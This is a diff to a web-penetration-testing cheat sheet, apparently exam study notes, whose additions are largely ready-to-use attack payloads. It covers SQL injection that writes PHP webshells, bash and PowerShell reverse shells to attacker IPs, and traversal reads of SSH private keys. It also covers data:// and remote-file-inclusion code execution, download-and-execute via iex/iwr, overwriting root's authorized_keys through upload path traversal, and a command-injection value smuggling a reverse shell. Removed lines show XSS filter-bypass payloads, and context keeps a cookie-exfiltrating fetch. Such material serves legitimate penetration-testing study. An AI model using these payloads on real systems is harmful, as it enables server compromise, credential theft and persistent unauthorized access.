@@ -36,8 +36,10 @@ admin' -- -
 
 -> dump
 ```
+' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
 -1 union select 1,2, group_concat(<column_names>) from <database_name>.<table_name>;#
 ```
+
 
 ### Webshell via SQLI
 -> view web server path  
@@ -48,6 +50,14 @@ LOAD_FILE('/etc/httpd/conf/httpd.conf')
 -> creating webshell
 ```
 select "<?php system($_GET['cmd']);?>" into outfile "/var/www/html/shell.php";
+```
+MYSQL to RCE
+```
+' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/webshell.php" -- //
+http://192.168.xx.xx/tmp/webshell.php?cmd=id
+
+reverse shell
+GET /tmp/webshell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.xx.xx/4444+0>%261'
 ```
  
 ### Reading Files via SQLI - MySQL
@@ -139,158 +149,6 @@ https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-Power
 ```
 5-> Detect if there are filters or blockages and modify as needed to make it work
 
-### Wordlists for XSS Bypass
-https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/wordlists/xss_bypass.txt
-https://gist.githubusercontent.com/rvrsh3ll/09a8b933291f9f98e8ec/raw/535cd1a9cefb221dd9de6965e87ca8a9eb5dc320/xxsfilterbypass.lst
-https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/XSS-Bypass-Strings-BruteLogic.txt
-https://raw.githubusercontent.com/payloadbox/xss-payload-list/master/Intruder/xss-payload-list.txt
-https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/XSS-Cheat-Sheet-PortSwigger.txt
-
-### XSS Auditor and XSS Filter
-https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xss.md  
-https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html  
-https://www.chromium.org/developers/design-documents/xss-auditor/  
-https://portswigger.net/daily-swig/xss-protection-disappears-from-microsoft-edge  
-https://developer.mozilla.org/pt-BR/docs/Web/HTTP/Headers/X-XSS-Protection  
-
-### XSS Keylogger
-https://rapid7.com/blog/post/2012/02/21/metasploit-javascript-keylogger/
-https://github.com/hadynz/xss-keylogger
-
-### XSS Mutation
-http://www.businessinfo.co.uk/labs/mxss/
-
-### XSS Poliglote
-https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
-
-### Regex Blacklist Filtering
--> Filter blocking on - Bypass  
-`(on\w+\s*=)`  
-```
-<svg onload%09=alert(1)> 
-<svg %09onload%20=alert(1)>
-<svg onload%09%20%28%2C%3B=alert(1)>
-<svg onload%0B=alert(1)>
-```  
-
-### Keyword Based in Filter
-#### Alert Blocked - Bypass
-```
-<script>\u0061lert(1)</script>
-<script>\u0061\u006C\u0065\u0072\u0074(1)</script>
-<script>eval("\u0061lert(1)")</script>  
-<script>eval("\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029")</script>
-```
-
-#### Removing script Tag - Bypass
-```
-<sCR<script>iPt>alert(1)</SCr</script>IPt>
-```
-
-### Scaping Quote
-#### Methods
--> String.fromCharCode()  
--> unescape  
-
-e.g.  
--> decode URI + unescape method (need eval)  
-```
-decodeURI(/alert(%22xss%22)/.source)
-decodeURIComponent(/alert(%22xss%22)/.source)
-```  
- 
-### Other bypass techniques
--> unicode  
-```
-<img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)"/>
-```
-
-Add execution sink:  
--> eval  
--> setInterval  
--> setTimeout  
-
--> octal  
-```
-<img src=x onerror="eval('\141lert(1)')"/>
-```
--> hexadecimal  
-```
-<img src=x onerror="setInterval('\x61lert(1)')"/>
-```
--> mix  (uni, hex, octa)  
-```
-<img src=x onerror="setTimeout('\x61\154\145\x72\164\x28\x31\x29')"/>
-```
-https://checkserp.com/encode/unicode/  
-http://www.unit-conversion.info/texttools/octal/  
-http://www.unit-conversion.info/texttools/hexadecimal/  
-
-### Other Examples
-#### HTML Tag
-```
-<div>here</div>
-```
-->  
-```
-<svg/onload=alert(1)
-```
-
-#### HTML Tag Attributes
-```
-<input value="here"/></input>
-```
- 
-->  
-```
-" /><script>alert(1)</script>
-```
-  
-#### Script Tag
-```
-<script>
-    var name="here";
-</script>
-```
-  
-->  
-```
-";alert(1);//
-```
-
-#### Event Attributes
-```
-<button onclick="here;">Okay!</button>
-```
-
-->  
-```
-alert(1)
-```
-
-#### Dom Based
-```
-<script>var ok = location.search.replace("?ok=", "");domE1.innerHTML = "<a href=\'"+ok+"\'>ok</a>";</script>
-```
-  
-->  
-```
-javascript:alert(1)
-```
-
-### JavaScript Encoding
--> jjencode  
-https://utf-8.jp/public/jjencode.html   
--> aaencode  
-https://utf-8.jp/public/aaencode.html  
--> jsfuck  
-http://www.jsfuck.com/  
--> Xchars.js  
-https://syllab.fr/projets/experiments/xcharsjs/5chars.pipeline.html  
-
-### Decoder - Obfuscation (Javascript Decoder and PHP)
-https://malwaredecoder.com/  
-
 ### XSS to LFI
 ```
 <img src=x onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
@@ -307,118 +165,109 @@ https://malwaredecoder.com/
 <script>fetch('http://<IP>/?cookie=' + btoa(document.cookie));</script>  
 ```
 
-### Template - Nuclei
-https://raw.githubusercontent.com/esetal/nuclei-bb-templates/master/xss-fuzz.yaml
-
 ## Git Exposed
 ```
-git-dumper http://site.com/.git .
+python3 -m venv git-dumper-venv && source git-dumper-venv/bin/activate && pip install git-dumper 
+git-dumper http://192.168.115.144/.git/ .
+cd .git
+git log
+show 44a055daf7a0cd777f28f444c0d29dddjw9c9wj11
 ```
-https://github.com/arthaud/git-dumper
-
-### Tools
-https://github.com/internetwache/GitTools
-
-## Broken Access Control - IDOR (Insecure Direct Object References)
-1. Search listing of Id's in requests and in case you don't find create at least two accounts and analysis requests involving ID's  
-2. Identify access controls in the application  
-3. Change the request method (GET, POST, PUT, DELETE, PATCH…)  
-4. search old versions of API's /api/v1/ /api/v2/ /api/v3/  
-5. Try sending a (*) instead of the ID, especially at search points  
-6. Brute-force IDs depending on context and predictability 
-	
-### IDOR + Parameter Pollution
-#### HTTP Parameter Pollution
-```
-GET /api/v1/messages?id=<Another_User_ID> # unauthourized
-GET /api/v1/messages?id=<You_User_ID>&id=<Another_User_ID> # authorized
-GET /api/v1/messages?id[]=<Your_User_ID>&id[]=<Another_User_ID>
-```
-	
-#### Json Parameter Pollution
-```
-POST /api/v1/messages
-{"user_id":<You_user_id>,"user_id":<Anoher_User_id>} 
-```
--> with a JSON Object
-```
-POST /api/v1/messages
-{"user_id":{"user_id":<Anoher_User_id>}} 
-```
--> with array  
-```
-{"user_id":001} #Unauthorized
-{"user_id":[001]} #Authorized
-```
-#### Random Case
-GET /admin/profile #Unauthorized
-GET /ADMIN/profile #Authorized
-
-### UUIDv1
-https://caon.io/docs/exploitation/other/uuid/
-https://github.com/felipecaon/uuidv1gen
-
-#### Others
--> add .json if in ruby
-```
-/user/1029 # Unauthorized
-/user/1029.json # Authorized
-```
-
-## Git Exposed
-```
-git-dumper http://site.com/.git .
-```
-https://github.com/arthaud/git-dumper
-
-### Tools
-https://github.com/internetwache/GitTools
 
 ## Local File Inclusion - LFI
-### Replace ../ - Bypass
-$language = str_replace('../', '', $_GET['file']);  
-```
-/....//....//....//....//etc/passwd  
-..././..././..././..././etc/paswd  
-....\/....\/....\/....\/etc/passwd 
-```
+LFI And Directory Traversal
+../../../../../../../../../etc/passwd
+../../../../../../../../../home/<user>/.ssh/authorized_keys
+../../../../../../../../../home/<user>/.ssh/id_ecdsa
+../../../../../../../../../home/<user>/.ssh/id_rsa
 
-### Block . and / - Bypass
+%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/<user>/.ssh/authorized_keys
+%2e%2e/%2e%2e/%2e%2e/%2e%2e./home/<user>/.ssh/id_ecdsa
+%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/<user>/.ssh/id_rsa
 
--> urlencode and Double urlencode /etc/passwd  
-```
-%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
-```
-```
-%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34
-```  
 ### PHP Wrappers
-
+Display Content
 ```
-data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id  
-expect://id  
-php://filter/read=convert.base64-encode/resource=index.php  
-php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini
+curl http://example.com/example/index.php?page=admin.php
+curl http://example.com/example/index.php?page=php://filter/resource=admin.php
+curl http://example.com/example/index.php?page=php://filter/convert.base64-encode/resource=admin.php
 ```
-
-### Filter PHP
--> Predefined Paths  
-preg_match('/^\.\/okay\/.+$/', $_GET['file'])  
-
+Code Execution
 ```
-./okay/../../../../etc/passwd
-```  
-
-### PHP Extension Bypass with Null Bytes
+data:// wrapper is used to achieve code execution
+data:// wrapper will not work in a default PHP installation. To exploit it, the allow_url_include setting needs to be enabled
+curl "http://example.com/example/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"                             
+echo -n '<?php echo system($_GET["cmd"]);?>' | base64
+output -> PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==
+curl "http://example.com/example/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
 ```
-https://site.com/index.php?file=/etc/passwd%00.php
-```  
--> Removing .php  
-```
-https://site.com/index.php?file=index.p.phphp
-```  
   
 #### LFI + File Upload
+```
+Using Executable Files
+PHP Code Execution
+One method to bypass this filter is to change the file extension to a less-commonly used PHP file extension such as .phps or .php7. This may allow us to bypass simple filters that only check for the most common file extensions, .php and .phtml.
+
+try Uppercase maybe they are not filtered .pHP
+combine file upload with RFI
+nc -nvlp 4444
+setup python server 80
+/usr/share/webshells/php/simple-backdoor.php
+curl http://192.168.xx.<victim>/example/uploads/simple-backdoor.pHP?cmd=dir
+
+PS>pwsh
+PS>$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.xx.<kali>",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
+$EncodedText =[Convert]::ToBase64String($Bytes)
+$EncodedText
+PS>exit
+
+powershell -enc JABjAG........
+curl http://192.168.xx.<victim>/example/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20ABjAGwAaQBlAG4AdAAgAD0AIABOAGUAd
+
+or
+curl http://192.168.xx.<victim>/styles/cmd.php --data-urlencode 'cmd=powershell -c iex (iwr -UseBasicParsing http://192.168.xx.<kali>/Invoke-PowerShellTcp.ps1)'
+
+linux
+curl http://192.168.xx.<victim>/tiny/uploads/cmd.php -d 'cmd=bash -c "bash -i >%26 /dev/tcp/192.168.xx.<kali>/4444 0>%261"'
+
+/config.php?cmd=id
+
+### Using Non-Executable Files
+
+When testing a file upload form, we should always determine what happens when a file is uploaded twice. If the web application indicates that the file already exists, we can use this method to brute force the contents of a web server. Alternatively, if the web application displays an error message, this may provide valuable information such as the programming language or web technologies in use.
+
+Apache,nginx use user www-data
+Microsoft IIS 7.5 and up use Network Service account, a passwordless built-in Windows identity with low privileges
+
+Let's try to overwrite the authorized_keys file in the home directory for root. If this file contains the public key of a private key we control, we can access the system via SSH as the root user. 
+
+kali@kali:~$ ssh-keygen
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/kali/.ssh/id_rsa): fileup
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in fileup
+Your public key has been saved in fileup.pub
+...
+chmod 600 fileup
+kali@kali:~$ cat fileup.pub > authorized_keys
+
+#to try it out curl http://192.168.xx.<victim>:7777/root/.ssh/authorized_keys --upload-file broker.pub
+
+rm ~/.ssh/known_hosts
+ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" root@192.168.xx.<victim>
+
+we replace/overwrite permission authorized_keys with our pub
+file upload
+filename="../../../../../../../../../../../../../../../../root/.ssh/authorized_keys"
+
+┌──(kali㉿kali)-[~/Desktop]
+└─$ ssh root@192.168.xx.<victim> -i ~/.ssh/fileup -p 2222 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no"
+
+```
+
 -> gif  
 ```
 echo 'GIF8<?php system($_GET["cmd"]); ?>' > ok.gif
@@ -481,22 +330,6 @@ http://ip/index.php?file=/var/lib/php/sessions/sess_<your_session>&cmd=id
 https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/master/fuzzing/linux-lfi-fuzzing.yaml
 https://raw.githubusercontent.com/CharanRayudu/Custom-Nuclei-Templates/main/dir-traversal.yaml
 
-### Wordlists
--> burp-parameter-names.txt - Wordlist for parameter fuzzing  
-https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt  
-	
--> Wordlist LFI - Linux  
-https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt  
-	
--> Wordlist LFI - Windows  
-https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt 
-	
--> bypass_lfi.txt  
-https://github.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/blob/main/wordlists/lfi_bypass.txt  
-	
--> poisoning.txt  
-https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/wordlists/posoning.txt  
-
 ## Remote File Inclusion (RFI)
 ### RFI to Webshell with null byte for image extension bypass
 ```
@@ -515,7 +348,25 @@ python -m http.server 80
 ```
 http://site.com/menu.php?file=http://<IP>/evil.txt&cmd=ipconfig
 ```
+```
+9.2.3. Remote File Inclusion (RFI)
+the allow_url_include option needs to be enabled to leverage RFI
+setup python server 80
+/usr/share/webshells/php/simple-backdoor.php
+python3 -m http.server 80
+curl "http://example.com/example/index.php?page=http://192.168.xx.<kali>/simple-backdoor.php&cmd=ls"
+curl "http://example.com/example/index.php?page=http://192.168.xx.<kali>/simple-backdoor.php&cmd=cat%20/etc/passwd"
+curl "http://example.com/example/index.php?page=http://192.168.xx.<kali>/simple-backdoor.php&cmd=ls%20-la%20/home/<user>/"
+curl "http://example.com/example/index.php?page=http://192.168.xx.<kali>/simple-backdoor.php&cmd=ls%20-la%20/home/<User>/.ssh"
+curl "http://example.com/example/index.php?page=http://192.168.xx.<kali>/simple-backdoor.php&cmd=ls%20-la%20/home/<User>/.ssh/authorized_keys"
+curl "http://example.com/example/index.php?page=http://192.168.xx.<kali>/simple-backdoor.php&cmd=ls%20-la%20/home/<User>/.ssh/id_rsa"
+curl "http://example.com/example/index.php?page=http://192.168.xx.<kali>/simple-backdoor.php&cmd=ls%20-la%20/home/<User>/.ssh/id_ecdsa"
 
+
+revshell using PHP Ivan Sincek -> https://www.revshells.com/
+nc -lvnp 4444
+curl "http://example.com/example/index.php?page=http://192.168.xx.<kali>5/shell.php"
+```
 ## OS Command Injection
 -> Special Characters
 ```
@@ -527,6 +378,8 @@ command %0A command
 || command
 `command`
 $(command)
+
+example: Archive=test%20--version%3Bbash+-c+'bash+-i+>%26+/dev/tcp/192.168.x.xxx/4444+0>%261'
 ```
 
 -> Out Of Band - OOB Exploitation
